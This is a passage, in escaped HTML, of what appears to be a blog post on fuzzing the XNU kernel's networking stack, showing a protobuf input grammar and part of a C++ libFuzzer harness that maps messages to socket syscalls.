c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.pu0xkfwwxrzi"&gt;&lt;span class="c7 c2"&gt;Writing a Fuzz Target&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;At this point, we&amp;rsquo;ve assembled a chunk of XNU into a convenient library, but we still need to interact with it by writing a fuzz target. At first, I thought I might write many targets for different features, but I decided to write one monolithic target for this project. I&amp;rsquo;m sure fine-grained targets could do a better job for functionality that&amp;rsquo;s harder to fuzz, e.g., the TCP state machine, but we will stick to one for simplicity.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;We&amp;rsquo;ll start by specifying an input grammar using protobuf, part of which is depicted below. This grammar is completely arbitrary and will be used by a corresponding C++ harness that we will write next. LibFuzzer has a plugin called libprotobuf-mutator that knows how to mutate protobuf messages. This will enable us to do grammar-based mutational fuzzing efficiently, while still leveraging coverage guided feedback. This is a very powerful combination.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9d16a9b39fd12c4bd200524ebbec29df78b7c54e"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;Socket&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;Domain&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;domain &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;SoType&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;so_type &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;Protocol&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;protocol &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// TODO: options, e.g. SO_ACCEPTCONN&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;Close&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required &lt;/span&gt;&lt;span class="c13"&gt;FileDescriptor&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fd &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;SetSocketOpt&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; optional &lt;/span&gt;&lt;span class="c13"&gt;Protocol&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;level &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; optional &lt;/span&gt;&lt;span class="c13"&gt;SocketOptName&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;name &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// TODO(nedwill): structure for val&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; optional bytes val &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; optional &lt;/span&gt;&lt;span class="c13"&gt;FileDescriptor&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fd &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;4&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;Command&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; oneof command &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c13"&gt;Packet&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ip_input &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c13"&gt;SetSocketOpt&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;set_sock_opt &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c13"&gt;Socket&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;socket &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c13"&gt;Close&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;close &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;4&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;message &lt;/span&gt;&lt;span class="c13"&gt;Session&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; repeated &lt;/span&gt;&lt;span class="c13"&gt;Command&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;commands &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; required bytes data_provider &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;2&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;I left some TODO comments intact so you can see how the grammar can always be improved. As I&amp;rsquo;ve done in similar fuzzing projects, I have a top-level message called &lt;/span&gt;&lt;span class="c9"&gt;Session&lt;/span&gt;&lt;span&gt;&amp;nbsp;that encapsulates a single fuzzer iteration or test case. This session contains a sequence of &amp;ldquo;commands&amp;rdquo; and a sequence of bytes that can be used when random, unstructured data is needed (e.g., when doing a &lt;/span&gt;&lt;span class="c9"&gt;copyin&lt;/span&gt;&lt;span&gt;). Commands are syscalls or random packets, which in turn are their own messages that have associated data. For example, we might have a session that has a single Command message containing a &amp;ldquo;Socket&amp;rdquo; message. That Socket message has data associated with each argument to the syscall. In our C++-based target, it&amp;rsquo;s our job to translate messages of this custom specification into real syscalls and related API calls. We inform libprotobuf-mutator that our fuzz target expects to receive one &amp;ldquo;Session&amp;rdquo; message at a time via the macro &lt;/span&gt;&lt;span class="c9"&gt;DEFINE_BINARY_PROTO_FUZZER&lt;/span&gt;&lt;span class="c8 c2"&gt;.&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.041bf215fa328f955891b762d77faa759acbf246"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;DEFINE_BINARY_PROTO_FUZZER&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;const&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;Session&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;session&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;// ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; std&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c6"&gt;set&lt;/span&gt;&lt;span class="c19"&gt;&amp;lt;int&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;open_fds&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;const&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;Command&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;command &lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;session&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;commands&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;retval &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;switch&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;command_case&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;case&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;Command&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c0"&gt;kSocket&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fd &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;err &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;socket_wrapper&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;socket&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;domain&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;socket&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;so_type&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;socket&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;protocol&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;fd&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;err &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// Make sure we&amp;#39;re tracking fds properly.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;open_fds&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;find&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;fd&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;open_fds&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c6"&gt;end&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;Found existing fd %d\n&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fd&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;assert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;false&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; open_fds&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;insert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;fd&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;case&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;Command&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c0"&gt;kClose&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; open_fds&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;erase&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;close&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;fd&lt;/span&gt;&lt;span class="c1"&gt;());&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; close_wrapper&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;close&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;fd&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;nullptr&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;case&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;Command&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c0"&gt;kSetSockOpt&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;s &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;set_sock_opt&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;fd&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;level &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;set_sock_opt&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;level&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;name &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;set_sock_opt&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;name&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; size_t size &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;set_sock_opt&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;val&lt;/span&gt;&lt;span class="c1"&gt;().&lt;/span&gt;&lt;span class="c0"&gt;size&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; std&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c0"&gt;unique_ptr&lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;[]&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;val&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c0"&gt;size&lt;/span&gt;&lt;span 